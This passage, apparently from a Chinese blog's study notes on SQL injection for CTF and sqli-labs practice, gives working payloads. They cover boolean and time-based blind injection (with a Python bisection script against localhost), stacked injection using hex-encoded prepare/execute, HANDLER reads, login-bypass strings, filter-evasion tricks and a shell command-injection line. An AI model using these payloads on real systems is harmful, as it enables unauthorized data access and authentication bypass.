&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;ascii&lt;/span&gt;(substr((select(flag)&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt;(flag)),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;number&#34;&gt;102&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;if () 第一个参数为真，则返回 1，假则返回 0&lt;br&gt;
substr (a,1,1) 表示从第一个字符开始，截取一个字符&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;其他可用函数：&lt;br&gt;
left()：&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;left(database(),1)  //前8个字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mid()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;2 分法脚本：&lt;/p&gt;
&lt;p&gt;ascii () 参数是布尔值则返回 true 或 false&lt;/p&gt;
&lt;p&gt;一下示例为获取数据库名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/sqli-labs-master/Less-8/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_dbname&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    db_name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 这个遍历是数据库名字的长度如果不够的话就一点一点猜测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (low &amp;lt; high):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 32~127是ascii值对应的字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;and ascii(substr(database(),%d,1))&amp;gt;%d --+&amp;quot;&lt;/span&gt; % (i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url1 = url + payload        &lt;span class=&#34;comment&#34;&gt;# 获取url（原url+sql语句构造的url）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res = requests.get(url1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You are in...........&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; res.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        db_name += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;数据库名称为:&amp;quot;&lt;/span&gt; + db_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get_dbname()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;没过滤和单引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没过滤和单引号&#34;&gt;#&lt;/a&gt; 没过滤 | 和单引号’&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;playload：用户名是字符串，要用’&#39; 包起来&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=&amp;quot;&amp;#x27;||substr(p,&amp;#123;&amp;#125;,1)&amp;lt;&amp;#x27;&amp;#123;&amp;#125;&amp;quot;.format(i,mid)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;时间盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#时间盲注&#34;&gt;#&lt;/a&gt; 时间盲注&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;判断时间盲注：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and sleep(3) --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;6数据不在数据库中&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6数据不在数据库中&#34;&gt;#&lt;/a&gt; 6. 数据不在数据库中&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;修改id=0或id=-1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;使用 if () 语句，若条件正确则有明显延迟&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;7cookie注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7cookie注入&#34;&gt;#&lt;/a&gt; 7.cookie 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;使用 burpsuite&lt;/li&gt;
&lt;li&gt;&lt;code&gt;refer注入：直接在请求中写入**referer:**&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http refer: HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8堆叠注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8堆叠注入&#34;&gt;#&lt;/a&gt; 8. 堆叠注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;使用情况：过滤了 select&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基本语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本语法&#34;&gt;#&lt;/a&gt; 基本语法：&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show databases;#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show tables;#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show columns from words;#		&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;;show columns from `1919810931114514`;#   // (字符串为表名操作时要加反引号)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;输入：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;1’ union select 1,2#&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;发现过滤 select，堆叠注入。以下为 show 函数用法：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;show databases// 列出服务器可访问的数据库&lt;br&gt;
 show tables// 显示该数据库内相关表的名称&lt;br&gt;
 show columns from tablename；// 显示表 tablename 的字段、字段类型、键值信息、是否可以用 null、默认值及其他信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;表名为数字时要用反引号括起来&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;爆出字段名后&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆出字段名后&#34;&gt;#&lt;/a&gt; 爆出字段名后&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;将：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from`1919810931114514`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;进行 16 进制编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构造 playload：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;prepare…from… 是预处理语句，会进行编码转换。&lt;/li&gt;
&lt;li&gt;execute 用来执行由 SQLPrepare 创建的 SQL 语句。&lt;/li&gt;
&lt;li&gt;SELECT 可以在一条语句里对多个变量同时赋值，而 SET 只能一次对一个变量赋值。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;将@a赋值为16进制编码后的语句，再将@a中的语句转换后给execsqp，执行execsql中的语句&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;handler语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#handler语句&#34;&gt;#&lt;/a&gt; handler 语句&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;handler 是 mysql 的专用语句，没有包含到 SQL 标准中，但它每次只能查询 1 次记录，而 select 可以根据需要返回多条查询结果。&lt;br&gt;
hander  &lt;code&gt;表名&lt;/code&gt;  open;           // 打开一个表&lt;br&gt;
 handler &lt;code&gt;表名&lt;/code&gt;  read frist;      // 查询第一个数据&lt;br&gt;
 handler &lt;code&gt;表名&lt;/code&gt;  read next;     // 查询之后的数据直到最后一个数据返回空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;handler`1919810931114514` open;handler`1919810931114514`read next;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;9万能密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9万能密码&#34;&gt;#&lt;/a&gt; 9. 万能密码:&lt;/h2&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27;or&amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27;or&amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;输入账号密码&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; t_user &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;AND&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;用 or 1=1 使 where 条件恒为 true&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤&#34;&gt;#&lt;/a&gt; 过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;过滤空格，{}：$IFS&lt;/li&gt;
&lt;li&gt;过滤 flag：&lt;/li&gt;
&lt;li&gt;将关键字 replace 为空格，使用双写绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat$IFS$9`ls` //`ls`可以输出查询结果的内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;双写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双写绕过&#34;&gt;#&lt;/a&gt; 双写绕过：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;playload:(check.php)?username=‘oorr 1=1%23&amp;amp;password=’&lt;br&gt;
 &lt;code&gt;%23为注释，注释掉后面的password，因此password可以随便写;注意先单引号闭合&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;10post注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10post注入&#34;&gt;#&lt;/a&gt; 10.post 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;常产生地方：登录框（less-11）&lt;/li&gt;
&lt;li&gt;数据包提交方式为 post&lt;/li&gt;
&lt;li&gt;此处注释用 #或者–&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信息搜集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息搜集&#34;&gt;#&lt;/a&gt; 信息搜集&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;如果我们输入 &amp;quot;%&amp;quot; 或者 &amp;quot;%1&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mover accent=&#34;true&#34;&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo&gt;¨&lt;/mo&gt;&lt;/mover&gt;&lt;mtext&gt;他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&lt;/mtext&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\&amp;quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&amp;quot;%\&amp;quot;,&amp;quot;%1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord accent&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6679em;&#34;&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;accent-body&#34; style=&#34;left:-0.25em;&#34;&gt;&lt;span class=&#34;mord&#34;&gt;¨&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1944em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&amp;quot; 就因为没有经过任何处理而被替换为空。如果 %1$ + 非 arg 格式类型，程序会无法识别占位符类型，变为空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;做题时遇到了函数 addslashes ()，会在单引号前面加 / 无法用单引号闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?name=1&amp;amp;pass=%1$&amp;#x27; or 1=1--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="web安全" />
        <updated>2023-03-24T16:00:00.000Z</updated>
    </entry>
</feed>
